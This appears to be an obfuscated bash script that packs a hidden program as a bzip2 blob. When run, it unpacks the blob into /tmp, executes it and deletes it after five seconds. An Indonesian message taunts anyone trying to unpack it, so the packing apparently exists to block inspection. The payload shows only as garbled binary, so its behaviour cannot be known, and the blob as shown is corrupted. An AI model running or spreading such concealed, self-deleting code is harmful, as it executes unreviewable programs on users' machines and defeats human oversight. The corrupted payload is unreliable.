#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��  �߀@��'�*����Pso֚&MHڃ�d�=@   2D���      ���L C `M0  "�jz������Sj   �I)�=L�24����4&���421�G��� z&pSpH�Ǳ�y<q,��*,�$xuc��چ�-�h!pb,������#	q��
<R�      ��Ne�'�}�>��ᶖAL�'7��`M\t�i�G��\?zQ�=}���
���
���#�#���y7�p�w%��7��f.�z?E��z�#��� ط%BBBBBBBBBBBp����aQ$$$$$&@��Fŷfy���ɯ��G����������x�y�G���>�8��� ��K�ܼ�O�H���s?���'�[�_�">�I%>�B>c��� �i�cc���ې��0:�X�j�Nn5Ԙ�^V��}�j�#q��I$�b�B9�Ծ����]�e$$��-�2�s59�
fЅ�`�Ay�ٷ���c�G�wt�>����Sm����OO9@�;z[��4����������^�'���nQ�F��q3�]b7��A}hb���	���b9\�j8���`�4��68eH5q{q����ڣ�ϐ��Xi�����#R6��.;���6�#1�Ȕ������F᥾#S}F`ʨB��Q�z$� Џ��{��$�o�GS��o+D�I$��z�t�5�A��J�Ayh�.�p�!6�